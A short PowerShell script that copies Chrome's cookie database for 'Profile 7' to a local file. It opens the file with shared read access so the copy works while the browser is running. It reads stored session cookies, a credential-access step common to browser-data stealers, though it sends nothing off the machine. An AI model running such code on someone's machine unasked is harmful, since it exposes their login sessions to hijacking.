$src = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 7\Network\Cookies"
$dst = "chrome_cookies.db"
if (Test-Path $src) {
    $inStream = [System.IO.File]::Open($src, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    $outStream = [System.IO.File]::Create($dst)
    $inStream.CopyTo($outStream)
    $inStream.Close()
    $outStream.Close()
    Write-Host "SUCCESSFULLY COPIED COOKIES FILE!"
} else {
    Write-Host "Source file does not exist: $src"
}
